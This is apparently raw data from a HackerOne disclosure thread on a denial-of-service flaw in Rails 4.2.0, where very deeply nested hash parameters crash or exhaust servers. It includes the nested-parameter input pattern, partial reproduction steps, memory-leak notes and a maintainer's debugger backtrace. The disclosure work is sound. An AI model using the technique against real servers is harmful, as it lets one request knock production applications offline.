Hashes can be passed to the application in the form of user[name]=foo\u0026user[address]=bar. Action Pack will then convert this into a hash in the form of `{ user[:name] =\u003e \"foo\", user[:address] =\u003e \"bar\" }`. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.\r\n\r\nThis was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.\r\n\r\nProduction Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.\r\n\r\n# Bug Notes\r\n\r\nIt seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It's possible that a loop is being hit here every time the SystemStackError occurs.\r\n\r\nI set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set 'catch SystemStackError'. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.\r\n\r\n# Reproduction Steps\r\n\r\nFor Webrick:\r\n\r\n1. rails new dos_test\r\n2. cd dos_test\r\n3. bundle exec rails generate controller welcome index\r\n4. Uncomment the `root 'welcome#index'` line in config/routes.rb\r\n5. SECRET_KEY_BASE='foo' bundle exec rails s -e production\r\n6.

At 25 levels of nesting, Rack started throwing a RangeError (which is inline with the param_depth_limit set in the Utils class).\n\nHowever, it appears that there is a memory leak somewhere. If I let the attack run with an added layer of nesting on each request while analyzing the memory, it just keeps going up and never gets freed. This will continue until the server runs out of memory and hangs the process. This is running with ruby 2.2.0p0 which should be fixing any potential symbol being created and not freed via the new GC. Pausing the attack doesn't result in any memory being freed. After pausing, I replayed a single attack multiple times (with a constant nesting level) and the memory continued to be eaten up without being freed.\n\nI've got to get going at the moment but I'll try some different parameters to try and narrow down what might be causing this.","automated_response":false,"created_at":"2015-02-13T03:08:17.003Z","updated_at":"2015-02-13T03:08:17.003Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":331378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Blech.

If you attach with a debugger, the backtrace looks like this:\n\n```\n(lldb) bt\n* thread #4: tid = 0x1c6d1, 0x00000001030f6edc ruby`vm_call0_body + 2108, stop reason = EXC_BAD_ACCESS (code=2, address=0x10440fff8)\n  * frame #0: 0x00000001030f6edc ruby`vm_call0_body + 2108\n    frame #1: 0x00000001030f88ac ruby`check_match + 268\n    frame #2: 0x00000001030df55f ruby`vm_exec_core + 6735\n    frame #3: 0x00000001030ef3a1 ruby`vm_exec + 129\n    frame #4: 0x00000001030f3fd5 ruby`invoke_block_from_c + 2213\n    frame #5: 0x00000001030ebd78 ruby`rb_yield_values + 408\n    frame #6: 0x00000001030f398a ruby`invoke_block_from_c + 602\n    frame #7: 0x00000001030ebbb8 ruby`rb_yield + 184\n    frame #8: 0x0000000102fdced1 ruby`each_pair_i + 17\n    frame #9: 0x0000000102fdd6d5 ruby`hash_foreach_iter + 37\n    frame #10: 0x0000000103087111 ruby`st_foreach_check + 113\n    frame #11: 0x0000000102fd7062 ruby`hash_foreach_call + 34\n```\n\n`EXC_BAD_ACCESS` is basically a memory error and usually delivered with a SEGV.  Apparently it is possible to cause a SEGV with a SystemStackError.  I'm trying to see if there's anything that can be done on the Ruby core side.  If not, we'll have to go with my patch and warn people not to do recursive functions with user input (which is not ideal).","automated_response":false,"created_at":"2015-02-20T23:53:00.122Z","updated_at":"2015-02-20T23:53:00.122Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":338475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, this got a bit more interesting.","automated_response":false,"created_at":"2015-02-23T18:55:48.824Z","updated_at":"2015-02-23T18:55:48.824Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":338476,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Well, this got a bit more interesting.","automated_response":false,"created_at":"2015-02-23T18:56:05.170Z","updated_at":"2015-02-23T18:56:05.170Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":392097,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @tenderlove, was wondering if this bug ended up getting some attention on the Ruby core side?","automated_response":false,"created_at":"2015-04-28T01:15:39.518Z","updated_at":"2015-04-28T01:15:39.518Z","actor":{"username":"ff7f00","cleared":false,"url":"/ff7f00","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/056/881bb562dd24e9dd908212404c622b4375920b1d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":438442,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ff7f00 hey, sorry for the slow response.
